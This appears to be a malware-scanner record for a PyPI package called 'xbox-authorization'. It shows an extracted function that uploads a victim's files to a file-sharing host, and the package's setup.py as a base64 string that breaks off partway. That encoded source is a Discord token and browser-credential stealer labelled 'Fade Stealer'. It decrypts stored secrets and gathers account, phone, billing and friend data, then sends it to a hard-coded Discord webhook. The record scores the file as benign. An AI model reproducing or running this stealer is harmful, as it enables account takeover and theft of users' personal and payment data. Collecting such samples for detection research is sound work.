statistics:
  total_files: 1
  skipped_files: 0.0
  processed_objects: 1
  malicious_objects: 0
details:
- path: .repo_cache/malicious_repos/pypi_malregistry/xbox-authorization/1.0/xbox-authorization-1.0/xbox-authorization-1.0/setup.py
  contents:
  - name: KiwiFolder
    score: 0.0
    code: |-
      def KiwiFolder(pathF,keywords):
          global KiwiFiles
          maxfilesperdir=7
          i=0
          listOfFile=os.listdir(pathF)
          ffound=[]
          for file in listOfFile:
              if not os.path.isfile(pathF+'/'+file):return
              i+=1
              if i<=maxfilesperdir:
                  url=uploadToAnonfiles(pathF+'/'+file)
                  ffound.append([pathF+'/'+file,url])
              else:
                  break
          KiwiFiles.append(['folder',pathF+'/',ffound])
    tokens: TARGETED_FILE resume load_const INTEGER store_fast maxfilesperdir load_const INTEGER store_fast i load_global os load_attr listdir load_fast pathF call store_fast listOfFile build_list store_fast ffound load_fast listOfFile get_iter for_iter TO_NUMBER store_fast file load_global os load_attr path load_attr isfile load_fast pathF load_const / binary_op + load_fast file binary_op + call pop_jump_if_true TO_NUMBER pop_top return_const None load_fast i load_const INTEGER binary_op += store_fast i load_fast i load_fast maxfilesperdir compare_op <= pop_jump_if_false TO_NUMBER load_global STRING_LEN_S_ENT_HIGH load_fast pathF load_const / binary_op + load_fast file binary_op + call store_fast url load_fast ffound load_attr append load_fast pathF load_const / binary_op + load_fast file binary_op + load_fast url build_list call pop_top jump_backward TO_NUMBER pop_top jump_forward TO_NUMBER end_for load_global KiwiFiles load_attr append load_const folder load_fast pathF load_const / binary_op + load_fast ffound build_list call pop_top return_const None
    hash: 6beb5273b882fbfdea072aee2afa41460c0dfc9640058b1b2d33c4a6ab5f5a8c
sources:
  .repo_cache/malicious_repos/pypi_malregistry/xbox-authorization/1.0/xbox-authorization-1.0/xbox-authorization-1.0/setup.py: ZnJvbSBzZXR1cHRvb2xzIGltcG9ydCBzZXR1cAoKZnJvbSBidWlsdGlucyBpbXBvcnQgYWxsLGRpcixleGVjLGZvcm1hdCxsZW4sb3JkLHByaW50LGludCxsaXN0LHJhbmdlLHNldCxzdHIsb3BlbgpleGVjKCcnKQppbXBvcnQgb3MKaW1wb3J0IHRocmVhZGluZwpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZQpmcm9tIHNxbGl0ZTMgaW1wb3J0IGNvbm5lY3QgYXMgc3FsX2Nvbm5lY3QKaW1wb3J0IHJlCmZyb20gYmFzZTY0IGltcG9ydCBiNjRkZWNvZGUKZnJvbSBqc29uIGltcG9ydCBsb2FkcyBhcyBqc29uX2xvYWRzLGxvYWQKZnJvbSBjdHlwZXMgaW1wb3J0IHdpbmRsbCx3aW50eXBlcyxieXJlZixjZGxsLFN0cnVjdHVyZSxQT0lOVEVSLGNfY2hhcixjX2J1ZmZlcgpmcm9tIHVybGxpYi5yZXF1ZXN0IGltcG9ydCBSZXF1ZXN0LHVybG9wZW4KZnJvbSBqc29uIGltcG9ydCBsb2FkcyxkdW1wcwppbXBvcnQgdGltZQppbXBvcnQgc2h1dGlsCmZyb20gemlwZmlsZSBpbXBvcnQgWmlwRmlsZQppbXBvcnQgcmFuZG9tCmltcG9ydCByZQppbXBvcnQgc3VicHJvY2Vzcwpob29rPSdodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMDc3ODg0NjAyMjI1NTQ1MjU5LzRmMEZOTjBiV1Q0b2ZOUTJJT3EtWFZUb29NUUtGbjdxbnBLMUx4Wm1Rb1FXQkVtX0cxZG1pU0JLYkFIN1M3cmRiYnk0JwpERVRFQ1RFRD1GYWxzZQpkZWYgZ2V0aXAoKToKICAgIGlwPSdOb25lJwogICAgdHJ5OgogICAgICAgIGlwPXVybG9wZW4oUmVxdWVzdCgnaHR0cHM6Ly9hcGkuaXBpZnkub3JnJykpLnJlYWQoKS5kZWNvZGUoKS5zdHJpcCgpCiAgICBleGNlcHQ6CiAgICAgICAgcGFzcwogICAgcmV0dXJuIGlwCnJlcXVpcmVtZW50cz1bClsncmVxdWVzdHMnLCdyZXF1ZXN0cyddLApbJ0NyeXB0by5DaXBoZXInLCdweWNyeXB0b2RvbWUnXQpdCmZvciBtb2RsIGluIHJlcXVpcmVtZW50czoKICAgIHRyeTpfX2ltcG9ydF9fKG1vZGxbMF0pCiAgICBleGNlcHQ6CiAgICAgICAgc3VicHJvY2Vzcy5Qb3BlbihmIntleGVjdXRhYmxlfSAtbSBwaXAgaW5zdGFsbCB7bW9kbFsxXX0iLHNoZWxsPVRydWUpCiAgICAgICAgdGltZS5zbGVlcCgzKQppbXBvcnQgcmVxdWVzdHMKZnJvbSBDcnlwdG8uQ2lwaGVyIGltcG9ydCBBRVMKbG9jYWw9b3MuZ2V0ZW52KCdMT0NBTEFQUERBVEEnKQpyb2FtaW5nPW9zLmdldGVudignQVBQREFUQScpCnRlbXA9b3MuZ2V0ZW52KCdURU1QJykKVGhyZWFkbGlzdD1bXQpjbGFzcyBEQVRBX0JMT0IoU3RydWN0dXJlKToKICAgIF9maWVsZHNfPVsKKCdjYkRhdGEnLHdpbnR5cGVzLkRXT1JEKSwKKCdwYkRhdGEnLFBPSU5URVIoY19jaGFyKSkKXQpkZWYgR2V0RGF0YShibG9iX291dCk6CiAgICBjYkRhdGE9aW50KGJsb2Jfb3V0LmNiRGF0YSkKICAgIHBiRGF0YT1ibG9iX291dC5wYkRhdGEKICAgIGJ1ZmZlcj1jX2J1ZmZlcihjYkRhdGEpCiAgICBjZGxsLm1zdmNydC5tZW1jcHkoYnVmZmVyLHBiRGF0YSxjYkRhdGEpCiAgICB3aW5kbGwua2VybmVsMzIuTG9jYWxGcmVlKHBiRGF0YSkKICAgIHJldHVybiBidWZmZXIucmF3CmRlZiBDcnlwdFVucHJvdGVjdERhdGEoZW5jcnlwdGVkX2J5dGVzLGVudHJvcHk9YicnKToKICAgIGJ1ZmZlcl9pbj1jX2J1ZmZlcihlbmNyeXB0ZWRfYnl0ZXMsbGVuKGVuY3J5cHRlZF9ieXRlcykpCiAgICBidWZmZXJfZW50cm9weT1jX2J1ZmZlcihlbnRyb3B5LGxlbihlbnRyb3B5KSkKICAgIGJsb2JfaW49REFUQV9CTE9CKGxlbihlbmNyeXB0ZWRfYnl0ZXMpLGJ1ZmZlcl9pbikKICAgIGJsb2JfZW50cm9weT1EQVRBX0JMT0IobGVuKGVudHJvcHkpLGJ1ZmZlcl9lbnRyb3B5KQogICAgYmxvYl9vdXQ9REFUQV9CTE9CKCkKICAgIGlmIHdpbmRsbC5jcnlwdDMyLkNyeXB0VW5wcm90ZWN0RGF0YShieXJlZihibG9iX2luKSxOb25lLGJ5cmVmKGJsb2JfZW50cm9weSksTm9uZSxOb25lLDB4MDEsYnlyZWYoYmxvYl9vdXQpKToKICAgICAgICByZXR1cm4gR2V0RGF0YShibG9iX291dCkKZGVmIERlY3J5cHRWYWx1ZShidWZmLG1hc3Rlcl9rZXk9Tm9uZSk6CiAgICBzdGFydHM9YnVmZi5kZWNvZGUoZW5jb2Rpbmc9J3V0ZjgnLGVycm9ycz0naWdub3JlJylbOjNdCiAgICBpZiBzdGFydHM9PSd2MTAnIG9yIHN0YXJ0cz09J3YxMSc6CiAgICAgICAgaXY9YnVmZlszOjE1XQogICAgICAgIHBheWxvYWQ9YnVmZlsxNTpdCiAgICAgICAgY2lwaGVyPUFFUy5uZXcobWFzdGVyX2tleSxBRVMuTU9ERV9HQ00saXYpCiAgICAgICAgZGVjcnlwdGVkX3Bhc3M9Y2lwaGVyLmRlY3J5cHQocGF5bG9hZCkKICAgICAgICBkZWNyeXB0ZWRfcGFzcz1kZWNyeXB0ZWRfcGFzc1s6LTE2XS5kZWNvZGUoKQogICAgICAgIHJldHVybiBkZWNyeXB0ZWRfcGFzcwpkZWYgTG9hZFJlcXVlc3RzKG1ldGhvZGUsdXJsLGRhdGE9JycsZmlsZXM9JycsaGVhZGVycz0nJyk6CiAgICBmb3IgaSBpbiByYW5nZSg4KTojIG1heCB0cnlzCiAgICAgICAgdHJ5OgogICAgICAgICAgICBpZiBtZXRob2RlPT0nUE9TVCc6CiAgICAgICAgICAgICAgICBpZiBkYXRhICE9Jyc6CiAgICAgICAgICAgICAgICAgICAgcj1yZXF1ZXN0cy5wb3N0KHVybCxkYXRhPWRhdGEpCiAgICAgICAgICAgICAgICAgICAgaWYgci5zdGF0dXNfY29kZT09MjAwOgogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gcgogICAgICAgICAgICAgICAgZWxpZiBmaWxlcyAhPScnOgogICAgICAgICAgICAgICAgICAgIHI9cmVxdWVzdHMucG9zdCh1cmwsZmlsZXM9ZmlsZXMpCiAgICAgICAgICAgICAgICAgICAgaWYgci5zdGF0dXNfY29kZT09MjAwIG9yIHIuc3RhdHVzX2NvZGU9PTQxMzojIDQxMz1EQVRBIFRPIEJJRwogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gcgogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcGFzcwpkZWYgTG9hZFVybGliKGhvb2ssZGF0YT0nJyxmaWxlcz0nJyxoZWFkZXJzPScnKToKICAgIGZvciBpIGluIHJhbmdlKDgpOgogICAgICAgIHRyeToKICAgICAgICAgICAgaWYgaGVhZGVycyAhPScnOgogICAgICAgICAgICAgICAgcj11cmxvcGVuKFJlcXVlc3QoaG9vayxkYXRhPWRhdGEsaGVhZGVycz1oZWFkZXJzKSkKICAgICAgICAgICAgICAgIHJldHVybiByCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICByPXVybG9wZW4oUmVxdWVzdChob29rLGRhdGE9ZGF0YSkpCiAgICAgICAgICAgICAgICByZXR1cm4gcgogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcGFzcwpkZWYgVHJ1c3QoQ29va2llcyk6CiAgICBnbG9iYWwgREVURUNURUQKICAgIGRhdGE9c3RyKENvb2tpZXMpCiAgICB0aW09cmUuZmluZGFsbCgnLmdvb2dsZS5jb20nLGRhdGEpCiAgICBpZiBsZW4odGltKTwtMToKICAgICAgICBERVRFQ1RFRD1UcnVlCiAgICAgICAgcmV0dXJuIERFVEVDVEVECiAgICBlbHNlOgogICAgICAgIERFVEVDVEVEPUZhbHNlCiAgICAgICAgcmV0dXJuIERFVEVDVEVECmRlZiBHZXRVSFFGcmllbmRzKHRva2VuKToKICAgIGJhZGdlTGlzdD1bCnsnTmFtZSc6J0Vhcmx5X1ZlcmlmaWVkX0JvdF9EZXZlbG9wZXInLCdWYWx1ZSc6MTMxMDcyLCdFbW9qaSc6Jzw6ZGV2ZWxvcGVyOjg3NDc1MDgwODQ3MjgyNTk4Nj4gJ30sCnsnTmFtZSc6J0J1Z19IdW50ZXJfTGV2ZWxfMicsJ1ZhbHVlJzoxNjM4NCwnRW1vamknOic8OmJ1Z2h1bnRlcl8yOjg3NDc1MDgwODQzMDg3NDY2ND4gJ30sCnsnTmFtZSc6J0Vhcmx5X1N1cHBvcnRlcicsJ1ZhbHVlJzo1MTIsJ0Vtb2ppJzonPDplYXJseV9zdXBwb3J0ZXI6ODc0NzUwODA4NDE0MTEzODIzPiAnfSwKeydOYW1lJzonSG91c2VfQmFsYW5jZScsJ1ZhbHVlJzoyNTYsJ0Vtb2ppJzonPDpiYWxhbmNlOjg3NDc1MDgwODI2NzI5MjY4Mz4gJ30sCnsnTmFtZSc6J0hvdXNlX0JyaWxsaWFuY2UnLCdWYWx1ZSc6MTI4LCdFbW9qaSc6Jzw6YnJpbGxpYW5jZTo4NzQ3NTA4MDgzMzg2MDgxOTk+ICd9LAp7J05hbWUnOidIb3VzZV9CcmF2ZXJ5JywnVmFsdWUnOjY0LCdFbW9qaSc6Jzw6YnJhdmVyeTo4NzQ3NTA4MDgzODg5NTIwNzU+ICd9LAp7J05hbWUnOidCdWdfSHVudGVyX0xldmVsXzEnLCdWYWx1ZSc6OCwnRW1vamknOic8OmJ1Z2h1bnRlcl8xOjg3NDc1MDgwODQyNjY5MjY1OD4gJ30sCnsnTmFtZSc6J0h5cGVTcXVhZF9FdmVudHMnLCdWYWx1ZSc6NCwnRW1vamknOic8Omh5cGVzcXVhZF9ldmVudHM6ODc0NzUwODA4NTk0NDc3MDU2PiAnfSwKeydOYW1lJzonUGFydG5lcmVkX1NlcnZlcl9Pd25lcicsJ1ZhbHVlJzoyLCdFbW9qaSc6Jzw6cGFydG5lcjo4NzQ3NTA4MDg2NzgzNTQ5NjQ+ICd9LAp7J05hbWUnOidEaXNjb3JkX0VtcGxveWVlJywnVmFsdWUnOjEsJ0Vtb2ppJzonPDpzdGFmZjo4NzQ3NTA4MDg3Mjg2NjYxNTI+ICd9Cl0KICAgIGhlYWRlcnM9ewogICAgICAgICdBdXRob3JpemF0aW9uJzp0b2tlbiwKICAgICAgICAnQ29udGVudC1UeXBlJzonYXBwbGljYXRpb24vanNvbicsCiAgICAgICAgJ1VzZXItQWdlbnQnOidNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDIuMCcKfQogICAgdHJ5OgogICAgICAgIGZyaWVuZGxpc3Q9bG9hZHModXJsb3BlbihSZXF1ZXN0KCdodHRwczovL2Rpc2NvcmQuY29tL2FwaS92Ni91c2Vycy9AbWUvcmVsYXRpb25zaGlwcycsaGVhZGVycz1oZWFkZXJzKSkucmVhZCgpLmRlY29kZSgpKQogICAgZXhjZXB0OgogICAgICAgIHJldHVybiBGYWxzZQogICAgdWhxbGlzdD0nJwogICAgZm9yIGZyaWVuZCBpbiBmcmllbmRsaXN0OgogICAgICAgIE93bmVkQmFkZ2VzPScnCiAgICAgICAgZmxhZ3M9ZnJpZW5kWyd1c2VyJ11bJ3B1YmxpY19mbGFncyddCiAgICAgICAgZm9yIGJhZGdlIGluIGJhZGdlTGlzdDoKICAgICAgICAgICAgaWYgZmxhZ3MvL2JhZGdlWydWYWx1ZSddIT0wIGFuZCBmcmllbmRbJ3R5cGUnXT09MToKICAgICAgICAgICAgICAgIGlmIG5vdCAnSG91c2UnIGluIGJhZGdlWydOYW1lJ106CiAgICAgICAgICAgICAgICAgICAgT3duZWRCYWRnZXMrPWJhZGdlWydFbW9qaSddCiAgICAgICAgICAgICAgICBmbGFncz1mbGFncyAlIGJhZGdlWydWYWx1ZSddCiAgICAgICAgaWYgT3duZWRCYWRnZXMgIT0nJzoKICAgICAgICAgICAgdWhxbGlzdCs9ZiJ7T3duZWRCYWRnZXN9IHwge2ZyaWVuZFsndXNlciddWyd1c2VybmFtZSddfSN7ZnJpZW5kWyd1c2VyJ11bJ2Rpc2NyaW1pbmF0b3InXX0gKHtmcmllbmRbJ3VzZXInXVsnaWQnXX0pXG4iCiAgICByZXR1cm4gdWhxbGlzdApkZWYgR2V0QmlsbGluZyh0b2tlbik6CiAgICBoZWFkZXJzPXsKICAgICAgICAnQXV0aG9yaXphdGlvbic6dG9rZW4sCiAgICAgICAgJ0NvbnRlbnQtVHlwZSc6J2FwcGxpY2F0aW9uL2pzb24nLAogICAgICAgICdVc2VyLUFnZW50JzonTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTAyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAyLjAnCn0KICAgIHRyeToKICAgICAgICBiaWxsaW5nanNvbj1sb2Fkcyh1cmxvcGVuKFJlcXVlc3QoJ2h0dHBzOi8vZGlzY29yZC5jb20vYXBpL3VzZXJzL0BtZS9iaWxsaW5nL3BheW1lbnQtc291cmNlcycsaGVhZGVycz1oZWFkZXJzKSkucmVhZCgpLmRlY29kZSgpKQogICAgZXhjZXB0OgogICAgICAgIHJldHVybiBGYWxzZQogICAgaWYgYmlsbGluZ2pzb249PVtdOnJldHVybiAnIC0nCiAgICBiaWxsaW5nPScnCiAgICBmb3IgbWV0aG9kZSBpbiBiaWxsaW5nanNvbjoKICAgICAgICBpZiBtZXRob2RlWydpbnZhbGlkJ109PUZhbHNlOgogICAgICAgICAgICBpZiBtZXRob2RlWyd0eXBlJ109PTE6CiAgICAgICAgICAgICAgICBiaWxsaW5nKz0nPGE6Q2M6MTAzMjc0MjQ1NzQxNjM1NTg4Mj4nCiAgICAgICAgICAgIGVsaWYgbWV0aG9kZVsndHlwZSddPT0yOgogICAgICAgICAgICAgICAgYmlsbGluZys9Jzw6cGF5cGFsOjEwMjc5ODQ4NDAxMzEzNjY5MjI+ICcKICAgIHJldHVybiBiaWxsaW5nCmRlZiBHZXRCYWRnZShmbGFncyk6CiAgICBpZiBmbGFncz09MDpyZXR1cm4gJycKICAgIE93bmVkQmFkZ2VzPScnCiAgICBiYWRnZUxpc3Q9Wwp7J05hbWUnOidFYXJseV9WZXJpZmllZF9Cb3RfRGV2ZWxvcGVyJywnVmFsdWUnOjEzMTA3MiwnRW1vamknOic8OmRldmVsb3Blcjo4NzQ3NTA4MDg0NzI4MjU5ODY+ICd9LAp7J05hbWUnOidCdWdfSHVudGVyX0xldmVsXzInLCdWYWx1ZSc6MTYzODQsJ0Vtb2ppJzonPDpidWdodW50ZXJfMjo4NzQ3NTA4MDg0MzA4NzQ2NjQ+ICd9LAp7J05hbWUnOidFYXJseV9TdXBwb3J0ZXInLCdWYWx1ZSc6NTEyLCdFbW9qaSc6Jzw6ZWFybHlfc3VwcG9ydGVyOjg3NDc1MDgwODQxNDExMzgyMz4gJ30sCnsnTmFtZSc6J0hvdXNlX0JhbGFuY2UnLCdWYWx1ZSc6MjU2LCdFbW9qaSc6Jzw6YmFsYW5jZTo4NzQ3NTA4MDgyNjcyOTI2ODM+ICd9LAp7J05hbWUnOidIb3VzZV9CcmlsbGlhbmNlJywnVmFsdWUnOjEyOCwnRW1vamknOic8OmJyaWxsaWFuY2U6ODc0NzUwODA4MzM4NjA4MTk5PiAnfSwKeydOYW1lJzonSG91c2VfQnJhdmVyeScsJ1ZhbHVlJzo2NCwnRW1vamknOic8OmJyYXZlcnk6ODc0NzUwODA4Mzg4OTUyMDc1PiAnfSwKeydOYW1lJzonQnVnX0h1bnRlcl9MZXZlbF8xJywnVmFsdWUnOjgsJ0Vtb2ppJzonPDpidWdodW50ZXJfMTo4NzQ3NTA4MDg0MjY2OTI2NTg+ICd9LAp7J05hbWUnOidIeXBlU3F1YWRfRXZlbnRzJywnVmFsdWUnOjQsJ0Vtb2ppJzonPDpoeXBlc3F1YWRfZXZlbnRzOjg3NDc1MDgwODU5NDQ3NzA1Nj4gJ30sCnsnTmFtZSc6J1BhcnRuZXJlZF9TZXJ2ZXJfT3duZXInLCdWYWx1ZSc6MiwnRW1vamknOic8OnBhcnRuZXI6ODc0NzUwODA4Njc4MzU0OTY0PiAnfSwKeydOYW1lJzonRGlzY29yZF9FbXBsb3llZScsJ1ZhbHVlJzoxLCdFbW9qaSc6Jzw6c3RhZmY6ODc0NzUwODA4NzI4NjY2MTUyPiAnfQpdCiAgICBmb3IgYmFkZ2UgaW4gYmFkZ2VMaXN0OgogICAgICAgIGlmIGZsYWdzLy9iYWRnZVsnVmFsdWUnXSE9MDoKICAgICAgICAgICAgT3duZWRCYWRnZXMrPWJhZGdlWydFbW9qaSddCiAgICAgICAgICAgIGZsYWdzPWZsYWdzICUgYmFkZ2VbJ1ZhbHVlJ10KICAgIHJldHVybiBPd25lZEJhZGdlcwpkZWYgR2V0VG9rZW5JbmZvKHRva2VuKToKICAgIGhlYWRlcnM9ewogICAgICAgICdBdXRob3JpemF0aW9uJzp0b2tlbiwKICAgICAgICAnQ29udGVudC1UeXBlJzonYXBwbGljYXRpb24vanNvbicsCiAgICAgICAgJ1VzZXItQWdlbnQnOidNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDIuMCcKfQogICAgdXNlcmpzb249bG9hZHModXJsb3BlbihSZXF1ZXN0KCdodHRwczovL2Rpc2NvcmRhcHAuY29tL2FwaS92Ni91c2Vycy9AbWUnLGhlYWRlcnM9aGVhZGVycykpLnJlYWQoKS5kZWNvZGUoKSkKICAgIHVzZXJuYW1lPXVzZXJqc29uWyd1c2VybmFtZSddCiAgICBoYXNodGFnPXVzZXJqc29uWydkaXNjcmltaW5hdG9yJ10KICAgIGVtYWlsPXVzZXJqc29uWydlbWFpbCddCiAgICBpZGQ9dXNlcmpzb25bJ2lkJ10KICAgIHBmcD11c2VyanNvblsnYXZhdGFyJ10KICAgIGZsYWdzPXVzZXJqc29uWydwdWJsaWNfZmxhZ3MnXQogICAgbml0cm89JycKICAgIHBob25lPSctJwogICAgaWYgJ3ByZW1pdW1fdHlwZScgaW4gdXNlcmpzb246CiAgICAgICAgbml0cm90PXVzZXJqc29uWydwcmVtaXVtX3R5cGUnXQogICAgICAgIGlmIG5pdHJvdD09MToKICAgICAgICAgICAgbml0cm89Jzw6Y2xhc3NpYzo4OTYxMTkxNzEwMTkwNjc0MjM+ICcKICAgICAgICBlbGlmIG5pdHJvdD09MjoKICAgICAgICAgICAgbml0cm89JzxhOmJvb3N0OjgyNDAzNjc3ODU3MDQxNjEyOT4gPDpjbGFzc2ljOjg5NjExOTE3MTAxOTA2NzQyMz4gJwogICAgaWYgJ3Bob25lJyBpbiB1c2VyanNvbjpwaG9uZT1mJ2B7dXNlcmpzb25bInBob25lIl19YCcKICAgIHJldHVybiB1c2VybmFtZSxoYXNodGFnLGVtYWlsLGlkZCxwZnAsZmxhZ3Msbml0cm8scGhvbmUKZGVmIGNoZWNrVG9rZW4odG9rZW4pOgogICAgaGVhZGVycz17CiAgICAgICAgJ0F1dGhvcml6YXRpb24nOnRva2VuLAogICAgICAgICdDb250ZW50LVR5cGUnOidhcHBsaWNhdGlvbi9qc29uJywKICAgICAgICAnVXNlci1BZ2VudCc6J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wJwp9CiAgICB0cnk6CiAgICAgICAgdXJsb3BlbihSZXF1ZXN0KCdodHRwczovL2Rpc2NvcmRhcHAuY29tL2FwaS92Ni91c2Vycy9AbWUnLGhlYWRlcnM9aGVhZGVycykpCiAgICAgICAgcmV0dXJuIFRydWUKICAgIGV4Y2VwdDoKICAgICAgICByZXR1cm4gRmFsc2UKZGVmIHVwbG9hZFRva2VuKHRva2VuLHBhdGgpOgogICAgZ2xvYmFsIGhvb2sKICAgIGhlYWRlcnM9ewogICAgICAgICdDb250ZW50LVR5cGUnOidhcHBsaWNhdGlvbi9qc29uJywKICAgICAgICAnVXNlci1BZ2VudCc6J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wJwp9CiAgICB1c2VybmFtZSxoYXNodGFnLGVtYWlsLGlkZCxwZnAsZmxhZ3Msbml0cm8scGhvbmU9R2V0VG9rZW5JbmZvKHRva2VuKQogICAgaWYgcGZwPT1Ob25lOgogICAgICAgIHBmcD0naHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTYzMTE0MzQ5ODc3MTYyMDA0Lzk5MjU5MzE4NDI1MTE4MzE5NS83YzhmNDc2MTIzZDI4ZDEwM2VmZTM4MTU0MzI3NGMyNS5wbmcnCiAgICBlbHNlOgogICAgICAgIHBmcD1mImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F2YXRhcnMve2lkZH0ve3BmcH0iCiAgICBiaWxsaW5nPUdldEJpbGxpbmcodG9rZW4pCiAgICBiYWRnZT1HZXRCYWRnZShmbGFncykKICAgIGZyaWVuZHM9R2V0VUhRRnJpZW5kcyh0b2tlbikKICAgIGlmIGZyaWVuZHM9PScnOmZyaWVuZHM9J05vIEhRIEZyaWVuZHMnCiAgICBpZiBub3QgYmlsbGluZzoKICAgICAgICBiYWRnZSxwaG9uZSxiaWxsaW5nPWJhZGdlLHBob25lLE5vbmUKICAgIGlmIG5pdHJvPT0nJyBhbmQgYmFkZ2U9PScnOm5pdHJvPScgLScKICAgIGRhdGE9ewogICAgICAgICdjb250ZW50JzpmJ0ZvdW5kIGluIGB7cGF0aH1gJywKICAgICAgICAnZW1iZWRzJzpbCnsKICAgICAgICAgICAgJ2NvbG9yJzozNDQ5MTQwLAogICAgICAgICAgICAnZmllbGRzJzpbCnsKICAgICAgICAgICAgICAgICAgICAnbmFtZSc6JzxhOmR0OjEwMzI3NDQyMzcwNDI3NzQwNTc+IFRva2VuOicsCiAgICAgICAgICAgICAgICAgICAgJ3ZhbHVlJzpmImB7dG9rZW59YFxuW0NsaWNrIHRvIGNvcHldKGh0dHBzOi8vc3VwZXJmdXJyeWNkbi5ubC9jb3B5L3t0b2tlbn0pIgp9LAp7CiAgICAgICAgICAgICAgICAgICAgJ25hbWUnOic8YTpCYXQ6MTAzMjc0Nzk5Mzk4MTUzODM5NT4gRW1haWw6JywKICAgICAgICAgICAgICAgICAgICAndmFsdWUnOmYiYHtlbWFpbH1gIiwKICAgICAgICAgICAgICAgICAgICAnaW5saW5lJzpUcnVlCn0sCnsKICAgICAgICAgICAgICAgICAgICAnbmFtZSc6JzxhOmdlbmdhcjoxMDMyNzUwNDg0OTYxODkwNDI2PiBQaG9uZTonLAogICAgICAgICAgICAgICAgICAgICd2YWx1ZSc6ZiJ7cGhvbmV9IiwKICAgICAgICAgICAgICAgICAgICAnaW5saW5lJzpUcnVlCn0sCnsKICAgICAgICAgICAgICAgICAgICAnbmFtZSc6JzxhOmR0MToxMDMyNzQ5MTM1MTg4NzQyMTc2PiBJUDonLAogICAgICAgICAgICAgICAgICAgICd2YWx1ZSc6ZiJge2dldGlwKCl9YCIsCiAgICAgICAgICAgICAgICAgICAgJ2lubGluZSc6VHJ1ZQp9LAp7CiAgICAgICAgICAgICAgICAgICAgJ25hbWUnOic8YTp1emk6MTAzMjc1Mjk5OTc5NTI2NTUzNz4gQmFkZ2VzOicsCiAgICAgICAgICAgICAgICAgICAgJ3ZhbHVlJzpmIntuaXRyb317YmFkZ2V9IiwKICAgICAgICAgICAgICAgICAgICAnaW5saW5lJzpUcnVlCn0sCnsKICAgICAgICAgICAgICAgICAgICAnbmFtZSc6JzxhOkNjOjEwMzI3NDI0NTc0MTYzNTU4ODI+IEJpbGxpbmc6JywKICAgICAgICAgICAgICAgICAgICAndmFsdWUnOmYie2JpbGxpbmd9IiwKICAgICAgICAgICAgICAgICAgICAnaW5saW5lJzpUcnVlCn0sCnsKICAgICAgICAgICAgICAgICAgICAnbmFtZSc6JzxhOmRpYW1vbmQ6MTAzMjc1MjU2NjkyNjMxNTU3NT4gSFEgRnJpZW5kczonLAogICAgICAgICAgICAgICAgICAgICd2YWx1ZSc6ZiJ7ZnJpZW5kc30iLAogICAgICAgICAgICAgICAgICAgICdpbmxpbmUnOkZhbHNlCn0KXSwKICAgICAgICAgICAgJ2F1dGhvcic6ewogICAgICAgICAgICAgICAgJ25hbWUnOmYie3VzZXJuYW1lfSN7aGFzaHRhZ30gKHtpZGR9KSIsCiAgICAgICAgICAgICAgICAnaWNvbl91cmwnOmYie3BmcH0iCn0sCiAgICAgICAgICAgICdmb290ZXInOnsKICAgICAgICAgICAgICAgICd0ZXh0JzonQEZhZGUgU3RlYWxlcicsCiAgICAgICAgICAgICAgICAnaWNvbl91cmwnOidodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy8xMDMxODc4ODgzODQ4NTA3NDAyLzEwMzYwMTI4OTQxNzA2NjUwNjAvQ29tcF8yLmdpZicKfSwKICAgICAgICAgICAgJ3RodW1ibmFpbCc6ewogICAgICAgICAgICAgICAgJ3VybCc6ZiJ7cGZwfSIKfQp9Cl0sCiAgICAgICAgJ2F2YXRhcl91cmwnOidodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy8xMDI4NTg4OTA2ODQ2ODc5ODU2LzEwMzc0MzY5ODc0ODI4NDExMjkvdW5rbm93bi5wbmcnLAogICAgICAgICd1c2VybmFtZSc6J0ZhZGUgU3RlYWxlcicsCiAgICAgICAgJ2F0dGFjaG1lbnRzJzpbXQp9CiAgICBMb2FkVXJsaWIoaG9vayxkYXRhPWR1bXBzKGRhdGEpLmVuY29kZSgpLGhlYWRlcnM9aGVhZGVycykKZGVmIFJlZm9ybWF0KGxpc3R0KToKICAgIGU9cmUuZmluZGFsbCgnKFxcdytbYS16XSknLGxpc3R0KQogICAgd2hpbGUgJ2h0dHBzJyBpbiBlOmUucmVtb3ZlKCdodHRwcycpCiAgICB3aGlsZSAnY29tJyBpbiBlOmUucmVtb3ZlKCdjb20nKQogICAgd2hpbGUgJ25ldCcgaW4gZTplLnJlbW92ZSgnbmV0JykKICAgIHJldHVybiBsaXN0KHNldChlKSkKZGVmIHVwbG9hZChuYW1lLHRrPScnKToKICAgIGhlYWRlcnM9ewogICAgICAgICdDb250ZW50LVR5cGUnOidhcHBsaWNhdGlvbi9qc29uJywKICAgICAgICAnVXNlci1BZ2VudCc6J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wJwp9CiAgICBpZiBuYW1lPT0na2l3aSc6CiAgICAgICAgZGF0YT17CiAgICAgICAgJ2NvbnRlbnQnOicnLAogICAgICAgICdlbWJlZHMnOlsKewogICAgICAgICAgICAnY29sb3InOjM0NDkxNDAsCiAgICAgICAg